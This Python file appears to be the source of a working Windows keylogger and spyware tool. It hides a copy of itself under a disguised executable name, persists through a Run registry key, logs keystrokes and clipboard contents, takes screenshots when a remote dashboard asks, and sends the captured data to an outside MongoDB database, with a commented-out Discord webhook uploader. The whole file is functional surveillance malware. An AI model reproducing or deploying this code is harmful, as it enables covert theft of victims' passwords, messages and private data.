import ctypes
import sys
import threading
import requests
from threading import Lock,Timer
import time
import os
from shutil import copy2
import winreg as reg
from getpass import getuser
from pynput.keyboard import Key, Listener
import tokens
from tkinter import Tk
import pyautogui
from pymongo import MongoClient
import io
import base64

##
u = getuser()
path_l = os.path.expandvars(f'%TEMP%//{u}_system_meta.txt')
path_e = os.path.expandvars(f'%TEMP%//AGDInvokerUtility.exe')
webhook_url = tokens.webhook_url
uri = tokens.mongo_uri
file_lock = Lock()
keystroke_buffer = []
##

# MongoDB Setup
client = MongoClient(uri)
db = client["Stealthpoint_DB"]
collection = db["logs"]
##

#identification
current_file = sys.executable
try:
    my_ip = public_ip = requests.get('https://api.ipify.org').text
except:
    my_ip = "Unknown"
    pass

#
midman = f"http://127.0.0.1:5000/api/{my_ip}"
#

#hide and add to startup with registry
try:
    copy2(current_file, path_e)
    attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e, 0x02)
except:
    pass
create_reg = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
open_key = reg.OpenKey(create_reg, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, reg.KEY_ALL_ACCESS)
try:
    reg.SetValueEx(open_key, 'AGDInvokerUtility', 0, reg.REG_SZ, path_e)
except:
    pass

#screenshot function
def take_screenshot():
    try:
        ss = pyautogui.screenshot()
        img_buffer = io.BytesIO()
        ss.save(img_buffer, format='JPEG', quality=50)
        img_bytes = img_buffer.getvalue()
        encoded = base64.b64encode(img_bytes).decode('utf-8')
        return encoded
    except Exception as e:
        return None

#Listen for ss commands from dashb
def check_screenshot():
    while True:
        try:
            response = requests.get(f"{midman}")
            if response.status_code == 200:
                data = response.json()
                if data.get("command") == "screenshot":
                    img_data = take_screenshot()
                    if img_data:
                        requests.post(f"{midman}/screenshot", json={"image": img_data})
        except Exception as e:
            pass
        time.sleep(15)

#listener code
def on_key_press(key):
    global keystroke_buffer
    try:
        k = key.char if key.char is not None else str(key)
    except AttributeError:
        k = str(key)
    if k == "Key.backspace":
        if keystroke_buffer: keystroke_buffer.pop()
    elif k == "Key.space":
        keystroke_buffer.append(" ")
    elif k == "Key.enter": keystroke_buffer.append("<ENTER>")
    elif "Key." not in k: 
        if ord(k) >= 32:
            keystroke_buffer.append(k)

    # if len(keystroke_buffer) >= 50:
    #     data_to_save = "".join(keystroke_buffer)
    #     keystroke_buffer = []
    #     save_to_file(data_to_save)


#save logs as backup 
def save_to_file(content):
    with file_lock:
        try:
            with open(path_l, "a") as f:
                f.write(content)
                f.flush()
        except Exception as e:
            pass
        


#log cleaner function
# def writetofile(key):
#     keydata = str(key)
#     keydata = keydata.replace("'", "")
#     if keydata == "Key.space":
#         keydata = " "
#     if keydata == "Key.cmd":
#         keydata = "-WIN-"
#     if keydata == "Key.shift" or keydata == "Key.shift_r":
#         keydata = ""
#     if keydata == "Key.backspace":
#         keydata = "-BACK-"
#     if keydata == "Key.alt_l" or keydata == "Key.alt_r":
#         keydata = "-ALT-"
#     if keydata == "Key.tab":
#         keydata = "-TAB-"
#     if keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
#         keydata = "-CTRL-"
#     with file_lock:
#         try:
#             with open(path_l, "a") as f:
#                 f.write(keydata)
#         except:
#             pass
#     ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)

#sending logfile to discord(testing/closed)
# def send_logfile(): 

#     with open(path_l, "rb") as f:
#         files = {"file": (path_l, f)}
#         attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
#     try:
#             response = requests.post(webhook_url, files=files)
#             print(response.status_code)
#     except:
#         pass
#     #schedule next send in 1 minute
#     threading.Timer(60, send_logfile).start()
#     file_stat = os.stat(path_l)
#     if file_stat.st_size > 7000000:
#         with open(path_l, "w") as f:
#             f.write("")
#time interval between sending logs
#threading.Timer(60, send_logfile).start()

#send logs to mongodb
def send_to_mongodb():
    global keystroke_buffer
    if keystroke_buffer:
        with file_lock:
            data_to_send = "".join(keystroke_buffer)
            keystroke_buffer = []
        try:
            r = Tk()
            result = r.selection_get(selection='CLIPBOARD')
        except:
            result = "No clipboard data"

    try:
        if data_to_send:
            # Push to MongoDB
            if data_to_send.strip():
                log_entry = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "username": u,
                "ip_address": my_ip,
                "payload": data_to_send,
                "clipboard": result
                }
                collection.insert_one(log_entry)
                save_to_file(data_to_send)
                r.destroy()

    except Exception as e:
        # print(f"Error sending to MongoDB: {e}") #remove after testing
        pass
# schedule next sync in 60 seconds
    Timer(60, send_to_mongodb).start()
    
cmd_thread = threading.Thread(target=check_screenshot, daemon=True)
cmd_thread.start()

#start loop
send_to_mongodb()

#start listening to keyboard
with Listener(on_press=on_key_press) as l:
    l.join()
